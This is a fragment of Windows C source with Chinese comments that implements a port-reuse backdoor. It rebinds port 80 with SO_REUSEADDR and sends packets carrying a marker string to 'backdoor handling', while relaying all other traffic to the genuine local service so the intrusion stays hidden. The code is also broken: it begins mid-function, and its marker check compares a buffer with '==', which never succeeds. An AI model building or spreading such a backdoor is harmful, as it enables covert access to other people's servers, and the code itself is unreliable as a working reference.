#include "winsock.h"
#include "windows.h"
#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#pragma comment(lib,"wsock32.lib")
#define RECV_PORT 80

SOCKET sock,sock1;
sockaddr_in ServerAddr;
sockaddr_in ClientAddr;
BOOL val;

 ServerAddr.sin_family=AF_INET;
 ServerAddr.sin_addr.s_addr=inet_addr("10.10.2.68");//或者htonl(INADDR_ANY);本地对外ip
 ServerAddr.sin_port=htons(RECV_PORT);
 val=TRUE;


  if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(char *)&val,sizeof(val))!=0)//设置socket选项用来重绑定端口
   {
       printf("设置socket选项错误!\n");
       return(-1);
   } 
 if(bind(sock,(struct sockaddr FAR *)&ServerAddr,sizeof(ServerAddr))==SOCKET_ERROR)//绑定端口
 {
   printf("socket绑定失败!");
   return(-1);
 }
 return(1);
}

struct SOCKSTRUCT
{
 SOCKET *lsock;
 SOCKET *csock;
};

LPTHREAD_START_ROUTINE talk(LPVOID lparam)//转发和判断处理数据线程,呵呵这里就用llikz的select方法来管理端口转发,忘了select用法的朋友参见llikz的文章
{
 struct SOCKSTRUCT *conn=(struct SOCKSTRUCT *)lparam;
 while(1)
 {
   fd_set fdr;
   FD_ZERO(&fdr);
   FD_SET(*(conn->csock),&fdr);
   FD_SET(*(conn->lsock),&fdr);
   int ret=select(*(conn->lsock)+2,&fdr,NULL,NULL,NULL);
   if(ret==-1)
     return(0);
   if(FD_ISSET(*(conn->lsock),&fdr))
   {
     char buffer[20000];
     int len=recv(*(conn->lsock),buffer,1024,0);
     if(len==-1)
     {
         printf("error\n");  
     }
     buffer[len]='\0';
     printf(buffer);
     if(buffer=="qingwa")//这里进行判断是否是自己的数据,这里我随便用一个代替,读者可以自己设定自己的判别标志.
     {
       //后门处理数据
       printf("成功接收");
     }      
     else send(*(conn->csock),buffer,len,0);//不是则转发到127.0.0.1上
   }
 }
 return(0);
}

DWORD ConnectProcess()
{  
 if(StartSock()==-1)
   return(-1);
 int Addrlen;
 Addrlen=sizeof(sockaddr_in);
 if(listen(sock,5)<0)
 {
   printf("监听失败!");
   return(-1);
 }
 printf("监听中.....\n");
 fd_set fdr;
 FD_ZERO(&fdr);
 FD_SET(sock,&fdr);
 int ret=select(sock+1,&fdr,NULL,NULL,NULL);
 if(ret==-1)
   return(-1);
 if(ret==1)
 {
   sock1=accept(sock,(struct sockaddr FAR *)&ClientAddr,&Addrlen);
     SOCKET csock=socket(AF_INET,SOCK_STREAM,0);
   struct sockaddr_in lc;
   lc.sin_family=AF_INET;
   lc.sin_port=htons(RECV_PORT);
   lc.sin_addr.S_un.S_addr=inet_addr("127.0.0.1");//应用程序或进程工作地址
     if(setsockopt(sock1,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0)//套接字sock1接收超时时处理
     {
     ret = GetLastError();
     return (-1);
   }
   if(setsockopt(csock,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0)//套接字csock接收超时处理
   {
     ret = GetLastError();
     return(-1);
   }
   if(connect(csock,(struct sockaddr *)&lc,sizeof(lc))==SOCKET_ERROR)
     return(-1);
   struct SOCKSTRUCT twosock;
   twosock.csock=&csock;
   twosock.lsock=&sock1;
   HANDLE hthread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)talk,(LPVOID)&twosock,0,NULL);
   WaitForSingleObject(hthread,INFINITE);
   CloseHandle(hthread);
 }
 WSACleanup();
 return(1);
}
 
int main()
{
 if(ConnectProcess()==-1)
   return(-1);
 return(1);
}
